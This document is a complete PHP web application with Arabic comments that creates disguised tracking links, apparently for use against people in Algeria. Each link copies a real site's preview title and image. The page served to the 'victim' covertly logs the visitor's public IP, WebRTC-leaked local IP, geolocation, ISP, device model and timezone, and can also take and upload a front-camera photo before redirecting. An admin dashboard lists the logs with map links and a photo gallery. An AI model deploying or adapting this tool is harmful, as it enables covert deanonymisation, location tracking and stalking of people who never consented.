<?php
// ضبط المنطقة الزمنية للجزائر بدقة
date_default_timezone_set('Africa/Algiers');

// إظهار الأخطاء للتشخيص
ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO('sqlite:tracker.db');
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // جدول الروابط مع خيار تفعيل الكاميرا
    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        use_cam INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        country TEXT, 
        city TEXT, 
        lat TEXT, 
        lon TEXT, 
        isp TEXT, 
        device_info TEXT, 
        device_model TEXT, 
        timezone TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    // جدول تخزين الصور الملتقطة
    $db->exec("CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        image_data TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("خطأ في قاعدة البيانات: " . $e->getMessage());
}

// دالة سحب العنوان والصورة الأصلية ديناميكياً من أي موقع
function fetch_real_meta($url) {
    $title = "";
    $image = "";

    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url, $matches)) {
        $video_id = $matches[1];
        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
        
        $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $oembed_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
        $json = curl_exec($ch);
        curl_close($ch);
        
        if ($json) {
            $data = json_decode($json, true);
            if (isset($data['title'])) {
                $title = $data['title'];
            }
        }
    }

    if (empty($title)) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
        $html = curl_exec($ch);
        curl_close($ch);

        if ($html) {
            $dom = new DOMDocument();
            @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
            $xpath = new DOMXPath($dom);

            $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content');
            if ($titleNodes->length > 0) {
                $title = $titleNodes->item(0)->nodeValue;
            } else {
                $nodes = $dom->getElementsByTagName('title');
                if ($nodes->length > 0) {
                    $title = $nodes->item(0)->nodeValue;
                }
            }

            if (empty($image)) {
                $imageNodes = $xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content');
                if ($imageNodes->length > 0) {
                    $image = $imageNodes->item(0)->nodeValue;
                }
            }
        }
    }

    if (empty($title)) {
        $title = parse_url($url, PHP_URL_HOST);
    }
    if (empty($image)) {
        $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
    }

    return ['title' => trim($title), 'image' => trim($image)];
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function parse_isp($isp_name, $org_name) {
    $combined = $isp_name . ' ' . $org_name;
    if (stripos($combined, 'Mobilis') !== false or stripos($combined, 'ATM') !== false) return 'Mobilis';
    if (stripos($combined, 'Djezzy') !== false or stripos($combined, 'Optimum Telecom') !== false) return 'Djezzy';
    if (stripos($combined, 'Ooredoo') !== false or stripos($combined, 'Wataniya') !== false) return 'Ooredoo';
    if (stripos($combined, 'Algérie Télécom') !== false or stripos($combined, 'Algerie Telecom') !== false or stripos($combined, 'AT') !== false) return 'Algérie Télécom';
    return trim($isp_name) ?: 'Unknown';
}

function get_device_type($ua) {
    $brand = 'Device';
    if (stripos($ua, 'Samsung') !== false) $brand = 'Samsung';
    elseif (stripos($ua, 'iPhone') !== false) $brand = 'iPhone';
    elseif (stripos($ua, 'Huawei') !== false) $brand = 'Huawei';
    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false) $brand = 'Xiaomi';
    elseif (stripos($ua, 'Oppo') !== false) $brand = 'Oppo';
    elseif (stripos($ua, 'Realme') !== false) $brand = 'Realme';
    elseif (stripos($ua, 'Infinix') !== false) $brand = 'Infinix';
    elseif (stripos($ua, 'Tecno') !== false) $brand = 'Tecno';

    if (stripos($ua, 'Android') !== false) return $brand . ' - Android';
    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return $brand . ' - iOS';
    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
    return 'Unknown Device';
}

function get_ip_details($ip) {
    if ($ip == '127.0.0.1' or $ip == '::1' or $ip == 'Unknown' or strpos($ip, '10.') === 0 or strpos($ip, '192.168.') === 0) {
        return ['country' => 'Algeria (Local)', 'city' => 'Local Network', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Localhost'];
    }
    $json = @file_get_contents("http://ip-api.com/json/" . $ip . "?fields=status,country,city,lat,lon,isp,org");
    $data = json_decode($json, true);
    if ($data and isset($data['status']) and $data['status'] == 'success') {
        return [
            'country' => $data['country'] ?? 'Unknown',
            'city' => $data['city'] ?? 'Unknown',
            'lat' => $data['lat'] ?? '36.7538', 'lon' => $data['lon'] ?? '3.0588',
            'isp' => parse_isp($data['isp'] ?? '', $data['org'] ?? '')
        ];
    }
    return ['country' => 'Unknown', 'city' => 'Unknown', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Unknown'];
}

$og_title = "YouTube";
$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
$target_redirect = "";
$link_use_cam = 0;

// 1. معالجة طلب الزائر عبر رابط التعقب
if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target_redirect = $link['target_url'];
        $og_title = $link['meta_title'];
        $og_image = $link['meta_image'];
        $link_use_cam = $link['use_cam'];

        // حفظ سجلات الـ IP والبيانات في الخلفية
        if (isset($_GET['save_log']) && $_GET['save_log'] == '1') {
            $public_ip = get_real_ip();
            $local_ip = $_GET['lip'] ?? 'Cellular / Direct';
            $port = $_SERVER['REMOTE_PORT'] ?? 'N/A';
            $geo = get_ip_details($public_ip);
            $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
            $device = get_device_type($ua);
            $device_model = $_GET['dmodel'] ?? 'Unknown Model';
            $tz = $_GET['tz'] ?? 'N/A';
            $created_at = date('Y-m-d H:i:s');

            try {
                $logStmt = $db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, device_model, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                $logStmt->execute([$code, $public_ip, $local_ip, $port, $geo['country'], $geo['city'], $geo['lat'], $geo['lon'], $geo['isp'], $device, $device_model, $tz, $created_at]);
            } catch (Exception $e) {}
            exit('OK');
        }

        // حفظ الصورة الملتقطة إذا تم تفعيل الكاميرا
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
            $img_base64 =$_POST['image'] ?? '';
            if (!empty($img_base64)) {
                try {
                    $capStmt =$db->prepare("INSERT INTO captures (code, image_data, created_at) VALUES (?, ?, ?)");
                    $capStmt->execute([$code,$img_base64, date('Y-m-d H:i:s')]);
                } catch (Exception $e) {}
            }
            exit('OK');
        }
    } else {
        die("Link not found.");
    }
}

// 2. إنشاء رابط جديد من لوحة التحكم مع خيار الكاميرا
$generated_link = "";
$tracking_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $use_cam = isset($_POST['use_cam']) ? 1 : 0;
    $meta = fetch_real_meta($target_url);

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt =$db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image, use_cam) VALUES (?, ?, ?, ?, ?)");
    $stmt->execute([$code, $target_url,$meta['title'], $meta['image'],$use_cam]);

    $tracking_code =$code;
    $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
}

// جلب السجلات للوحة التحكم
$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $logs =$stmt->fetchAll(PDO::FETCH_ASSOC);

    $capStmt =$db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
    $capStmt->execute([$filter_code]);
    $captures =$capStmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
    $captures =$db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
}

// واجهة الضحية
if (isset($_GET['r']) && !empty($target_redirect)):
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title><?php echo htmlspecialchars($og_title); ?></title>
    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
    <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
    <meta property="og:type" content="website">
    <style>
        body { background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; flex-direction: column; }
        .loader { border: 4px solid rgba(255,255,255,0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #38bdf8; animation: spin 1s linear infinite; margin-bottom: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { font-size: 13px; color: #94a3b8; }
    </style>
    <script>
        const useCam = <?php echo $link_use_cam; ?>;

        // استخراج الـ IP المحلي بدقة تامة لجميع أنواع الأجهزة والشبكات
        function getLocalIP(callback) {
            let foundLocal = false;
            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) {
                callback("Cellular / Direct");
                return;
            }
            let pc = new RTCPeerConnection({ iceServers: [{ urls: ["stun:stun.l.google.com:19302", "stun:stun1.l.google.com:19302"] }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (myIP) {
                    let ip = myIP[1];
                    // فحص نطاقات الأيبيهات المحلية الشائعة
                    if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.") || ip.startsWith("169.")) {
                        if (!foundLocal) {
                            foundLocal = true;
                            callback(ip);
                            pc.onicecandidate = null;
                        }
                    }
                }
            };
            setTimeout(() => {
                if (!foundLocal) {
                    callback("Cellular / Direct");
                }
            }, 300);
        }

        // استخراج اسم ورطة طراز الجهاز الحقيقي بدقة
        function getDeviceModel() {
            let ua = navigator.userAgent;
            let model = "Standard Device";

            // استخراج الهواتف الشائعة من الـ User-Agent بوضوح
            if (ua.includes("iPhone")) return "iPhone";
            if (ua.includes("iPad")) return "iPad";
            
            let match = ua.match(/\(([^)]+)\)/);
            if (match && match[1]) {
                let parts = match[1].split(';');
                for (let p of parts) {
                    p = p.trim();
                    if (p.includes("SM-") || p.includes("Redmi") || p.includes("Pixel") || p.includes("M2") || p.includes("CPH") || p.includes("V2") || p.includes("Honor") || p.includes("HUAWEI")) {
                        return p;
                    }
                }
                // أخذ آخر جزء مفيد إذا لم يجد الطراز بحرفي Build
                let lastPart = parts[parts.length - 1].trim();
                if (lastPart && !lastPart.includes("Apple") && !lastPart.includes("Gecko")) {
                    return lastPart;
                }
            }
            return "Android / PC Device";
        }

        document.addEventListener("DOMContentLoaded", function() {
            const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
            const targetUrl = "<?php echo $target_redirect; ?>";

            let deviceModel = getDeviceModel();

            getLocalIP(function(localIp) {
                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const logUrl = `/?r=${redirectCode}&save_log=1&lip=${encodeURIComponent(localIp)}&dmodel=${encodeURIComponent(deviceModel)}&tz=${encodeURIComponent(tz)}`;
                
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(logUrl);
                } else {
                    fetch(logUrl, { method: 'GET', keepalive: true });
                }

                if (useCam === 1) {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                        .then(stream => {
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            video.play();
                            
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                canvas.width = 640;
                                canvas.height = 480;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                
                                const imageData = canvas.toDataURL('image/jpeg', 0.85);
                                stream.getTracks().forEach(track => track.stop());

                                const formData = new URLSearchParams();
                                formData.append('save_capture', '1');
                                formData.append('image', imageData);

                                fetch(`/?r=${redirectCode}`, {
                                    method: 'POST',
                                    body: formData
                                }).finally(() => {
                                    window.location.replace(targetUrl);
                                });
                            }, 800);
                        })
                        .catch(err => {
                            window.location.replace(targetUrl);
                        });
                } else {
                    setTimeout(function() {
                        window.location.replace(targetUrl);
                    }, 300);
                }
            });
        });
    </script>
</head>
<body>
    <div class="loader"></div>
    <p>جاري التحميل...</p>
</body>
</html>
<?php 
    exit(); 
endif; 
?>
<!-- لوحة التحكم الإدارية المتكاملة -->
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم الشاملة والتعقب</title>
    <style>
        :root {
            --bg-main: #0b0f17;
            --bg-card: #131b2e;
            --border-color: #1e293b;
            --text-main: #e2e8f0;
            --text-muted: #64748b;
            --accent: #3b82f6;
            --accent-hover: #2563eb;
            --success: #10b981;
            --danger: #ef4444;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; line-height: 1.6; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
        .wrapper { max-width: 1200px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
        
        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 10px; padding: 25px; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.2); }
        h2 { font-size: 14px; font-weight: 600; margin-bottom: 16px; color: #f8fafc; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; letter-spacing: 0.5px; }

        .form-row { display: flex; gap: 10px; position: relative; flex-wrap: wrap; }
        input[type="text"] { flex: 1; background: #0f172a; border: 1px solid var(--border-color); border-radius: 6px; padding: 12px 14px; color: #f8fafc; font-size: 14px; outline: none; transition: border 0.2s; min-width: 250px; }
        input[type="text"]:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
        
        .checkbox-group { display: flex; align-items: center; gap: 8px; color: #38bdf8; font-size: 13px; font-weight: 600; cursor: pointer; background: #0f172a; border: 1px solid var(--border-color); padding: 0 15px; border-radius: 6px; height: 46px; }
        input[type="checkbox"] { width: 18px; height: 18px; accent-color: var(--accent); cursor: pointer; }

        .btn { background: var(--accent); color: white; border: none; padding: 0 20px; border-radius: 6px; font-weight: 600; cursor: pointer; transition: background 0.2s; text-decoration: none; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; white-space: nowrap; height: 46px; }
        .btn:hover { background: var(--accent-hover); }
        .btn-danger { background: var(--danger); }
        .btn-danger:hover { background: #dc2626; }
        .btn-secondary { background: #334155; color: #f8fafc; border: 1px solid var(--border-color); }
        .btn-secondary:hover { background: #475569; }

        .input-action-group { position: relative; flex: 1; display: flex; gap: 6px; min-width: 250px; }
        .action-btn-inline { background: #1e293b; color: #cbd5e1; border: 1px solid var(--border-color); padding: 0 14px; font-size: 12px; border-radius: 6px; cursor: pointer; height: 46px; font-weight: 600; }
        .action-btn-inline:hover { background: #334151; color: #fff; }

        .result-panel { background: #0f172a; border: 1px solid var(--border-color); padding: 16px; border-radius: 6px; margin-top: 15px; }
        .result-panel label { display: block; font-size: 11px; color: var(--text-muted); margin-bottom: 6px; text-transform: uppercase; }
        .link-flex { display: flex; gap: 8px; }

        .big-tracking-code-box { background: #0f172a; border: 2px dashed #3b82f6; padding: 15px; border-radius: 6px; text-align: center; margin-top: 15px; }
        .big-tracking-code-box span { font-size: 11px; color: var(--text-muted); display: block; text-transform: uppercase; margin-bottom: 5px; }
        .big-code-val { font-size: 26px; font-weight: bold; color: #38bdf8; letter-spacing: 2px; font-family: monospace; }

        .toolbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
        .search-form { display: flex; gap: 8px; max-width: 380px; width: 100%; }

        .table-wrap { overflow-x: auto; border: 1px solid var(--border-color); border-radius: 6px; margin-bottom: 25px; }
        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 12px; min-width: 1000px; }
        th { background: #0f172a; color: var(--text-muted); padding: 12px 15px; border-bottom: 1px solid var(--border-color); font-weight: 600; white-space: nowrap; text-transform: uppercase; }
        td { padding: 12px 15px; border-bottom: 1px solid var(--border-color); color: #cbd5e1; white-space: nowrap; }
        tr:hover { background: rgba(30, 41, 59, 0.4); }
        
        .code-badge { background: rgba(59, 130, 246, 0.1); color: #38bdf8; padding: 4px 8px; border-radius: 4px; font-family: monospace; font-size: 12px; border: 1px solid rgba(59, 130, 246, 0.2); }
        .ip-public { font-family: monospace; color: #38bdf8; }
        .ip-local { font-family: monospace; color: #34d399; }
        .port-tag { font-family: monospace; color: #f43f5e; background: rgba(244, 63, 94, 0.1); padding: 2px 6px; border-radius: 4px; }
        .model-tag { color: #facc15; font-weight: 500; font-family: monospace; }

        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 15px; margin-top: 15px; }
        .card-img { background: #0f172a; border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; padding: 10px; text-align: center; }
        .card-img img { width: 100%; height: 180px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
        .card-meta { margin-top: 8px; font-size: 11px; color: var(--text-muted); display: flex; justify-content: space-between; align-items: center; }

        footer { text-align: center; margin-top: 40px; font-size: 12px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
        footer span { color: #38bdf8; font-weight: 600; }
    </style>
    <script>
        async function pasteClipboard(inputName) {
            try {
                const text = await navigator.clipboard.readText();
                document.querySelector(`input[name="${inputName}"]`).value = text;
            } catch (err) {
                alert('فشل اللصق التلقائي، يرجى اللصق يدوياً (Ctrl+V)');
            }
        }

        function copyText(text, btnElement) {
            navigator.clipboard.writeText(text).then(() => {
                const original = btnElement.innerText;
                btnElement.innerText = "تم النسخ";
                btnElement.style.background = "#10b981";
                setTimeout(() => {
                    btnElement.innerText = original;
                    btnElement.style.background = "";
                }, 2000);
            });
        }
    </script>
</head>
<body>
    <div class="wrapper">
        
        <section class="section-box">
            <h2>توليد رابط تعقب جديد</h2>
            <form method="POST" class="form-row">
                <div class="input-action-group">
                    <button type="button" class="action-btn-inline" onclick="pasteClipboard('target_url')">لصق</button>
                    <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف هنا..." required>
                </div>
                <label class="checkbox-group">
                    <input type="checkbox" name="use_cam" value="1"> تفعيل الكاميرا الأمامية
                </label>
                <button type="submit" name="create" class="btn">توليد الرابط</button>
            </form>

            <?php if (!empty($generated_link)): ?>
                <div class="result-panel">
                    <label>رابط التعقب النشط:</label>
                    <div class="link-flex">
                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">نسخ الرابط</button>
                    </div>
                    
                    <div class="big-tracking-code-box">
                        <span>كود التعقب الخاص بالرابط</span>
                        <div class="big-code-val"><?php echo htmlspecialchars($tracking_code); ?></div>
                        <button type="button" class="btn btn-secondary" style="margin-top: 10px; height: 36px; font-size: 11px;" onclick="copyText('<?php echo htmlspecialchars($tracking_code); ?>', this)">نسخ الكود</button>
                    </div>

                    <div style="display: flex; justify-content: flex-end; align-items: center; margin-top: 12px; font-size: 12px;">
                        <a href="/?track=<?php echo htmlspecialchars($tracking_code); ?>" style="color: #38bdf8; text-decoration: none;">عرض سجلات هذا الكود حصرياً ←</a>
                    </div>
                </div>
            <?php endif; ?>
        </section>

        <section class="section-box">
            <div class="toolbar">
                <h2>سجلات الزيارات والتحليلات الحية</h2>
                <form method="GET" class="search-form">
                    <button type="button" class="action-btn-inline" onclick="pasteClipboard('track')" style="height: 42px;">لصق</button>
                    <input type="text" name="track" placeholder="بحث بكود التعقب..." value="<?php echo htmlspecialchars($filter_code); ?>" style="height: 42px;">
                    <button type="submit" class="btn" style="height: 42px;">بحث</button>
                    <?php if(!empty($filter_code)): ?>
                        <a href="/" class="btn btn-danger" style="height: 42px; text-decoration:none; display:flex; align-items:center;">إلغاء</a>
                    <?php endif; ?>
                </form>
            </div>

            <div class="table-wrap">
                <table>
                    <thead>
                        <tr>
                            <th>#ID</th>
                            <th>الكود</th>
                            <th>IP العام</th>
                            <th>IP المحلي</th>
                            <th>المنفذ</th>
                            <th>نوع النظام</th>
                            <th>طراز الجهاز (Model)</th>
                            <th>الموقع الجغرافي</th>
                            <th>مزود الخدمة</th>
                            <th>الوقت (التوقيت الجزائري)</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (empty($logs)): ?>
                            <tr><td colspan="10" style="text-align: center; color: var(--text-muted); padding: 30px;">لا توجد أي سجلات زيارات مطابقة.</td></tr>
                        <?php else: ?>
                            <?php foreach ($logs as$log): ?>
                            <tr>
                                <td><?php echo $log['id']; ?></td>
                                <td>
                                    <span class="code-badge"><?php echo htmlspecialchars($log['code']); ?></span>
                                </td>
                                <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? 'N/A'); ?></td>
                                <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? 'N/A'); ?></td>
                                <td><span class="port-tag"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></span></td>
                                <td style="font-weight: 500; color: #f8fafc;"><?php echo htmlspecialchars($log['device_info']); ?></td>
                                <td class="model-tag"><?php echo htmlspecialchars($log['device_model'] ?? 'N/A'); ?></td>
                                <td>
                                    <span><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></span><br>
                                    <a href="https://www.google.com/maps?q=<?php echo htmlspecialchars($log['lat']); ?>,<?php echo htmlspecialchars($log['lon']); ?>" target="_blank" style="font-size: 11px; color: #38bdf8; text-decoration: none;">عرض الخريطة ↗</a>
                                </td>
                                <td style="color: #38bdf8;"><?php echo htmlspecialchars($log['isp']); ?></td>
                                <td style="color: #10b981; font-weight: 500;"><?php echo htmlspecialchars($log['created_at']); ?></td>
                            </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>

            <h2 style="margin-top: 10px;">معرض الصور الملتقطة للكاميرا</h2>
            <?php if (empty($captures)): ?>
                <p style="text-align: center; color: var(--text-muted); padding: 20px;">لا توجد أي صور ملتقطة حتى الآن.</p>
            <?php else: ?>
                <div class="gallery-grid">
                    <?php foreach ($captures as$cap): ?>
                        <div class="card-img">
                            <a href="<?php echo $cap['image_data']; ?>" target="_blank">
                                <img src="<?php echo $cap['image_data']; ?>" alt="Captured">
                            </a>
                            <div class="card-meta">
                                <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
                                <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
        </section>

    </div>

    <footer>
        <p>Powered by <span>azeez</span> &copy; 2026</p>
    </footer>
</body>
</html>
